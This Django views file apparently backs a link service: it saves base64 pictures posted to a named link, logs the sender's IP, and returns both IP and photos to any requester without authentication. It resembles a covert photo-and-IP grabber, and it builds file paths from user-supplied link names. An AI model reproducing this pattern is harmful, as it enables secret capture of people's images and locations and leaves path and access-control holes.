from django.shortcuts import render
from django.http import JsonResponse
from rest_framework.decorators import api_view
from rest_framework.parsers import JSONParser
from base64 import b64decode, b64encode
from loguru import logger
from datetime import datetime as dt
from os.path import isfile, isdir
from os import mkdir, listdir
from .models import Uri_link

logger.add("logs.json", format="{time} {level} {message}", level="DEBUG", rotation="5 MB", compression="zip", serialize=True)
@api_view(['POST'])
def pic_saver(request, p_link):
    logger.info(f"someone made a post request to {p_link}, creating dir in media")
    try:
        url_db = Uri_link.objects.get(url=p_link)
    except Uri_link.DoesNotExist:
        return JsonResponse({"status":"Not found"}, status=404)

    dir_path = f"media/{p_link}"
    if not isdir(dir_path):
        mkdir(dir_path)
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    try:
        url_db.ip = ip
        url_db.save()
        logger.info(f"{ip=} for {p_link} was writen to DB!")
    except Exception as e:
        logger.error(f"Error during writing {ip=} to DB, reason: {e}")

    try:
        data = JSONParser().parse(request)
        b64_e = data['b64_pic'].split(',')[1]
        decoded = b64decode(b64_e)

        date = dt.now().strftime("%d_%m_%Y")
        tmp = 0
        f_path = f"media/{p_link}/{date}_{tmp}.png"
        if isfile(f_path):
            tmp += 1
        with open(f"media/{p_link}/{date}_{tmp}.png","wb") as f:
            f.write(decoded)
        
        return JsonResponse({"status":"saved"}, status=200)
    except Exception as e:
        logger.error(e)
        return JsonResponse({"status":"error"}, status=400)

@api_view(["POST"])
def create_link(request):
    try:
        data = JSONParser().parse(request)
        logger.debug(f"User \'name\' inserts: {data['name']} and \'url_name\': {data['url_name']}")
    except Exception as e:
        logger.error(f"Bad json request: {e=}")
        return JsonResponse({"status":"bad json"}, status=400)

    try:
        new_url = Uri_link.objects.create(name=data['name'],url=data['url_name'])
    except Exception as e:
        logger.error(e)
        return JsonResponse({"status":"bad data"}, status=400)
    return JsonResponse({"status":"success"})

@api_view(["GET"])
def get_log(request, link):
    try:
        url_db = Uri_link.objects.get(url=link)
    except Uri_link.DoesNotExist:
        return JsonResponse({"status":"Not found"}, status=404)
    try:
        photo_arr = []
        photos_path = listdir(f"media/{link}")
        for photo in photos_path:
            with open(f"media/{link}/{photo}", "rb") as tmp_ph:
                bytenoded_str = b64encode(tmp_ph.read()) #bytes
                str_enc = bytenoded_str.decode('utf-8')  # str
                photo_arr.append({photo:str_enc})
    except FileNotFoundError:
        return JsonResponse({"ip":url_db.ip, "photos":"No photos"},status=200)
    except Exception as e:
        return JsonResponse({"error":e},status=400)
    return JsonResponse({"ip":url_db.ip, "photos":photo_arr},status=200)
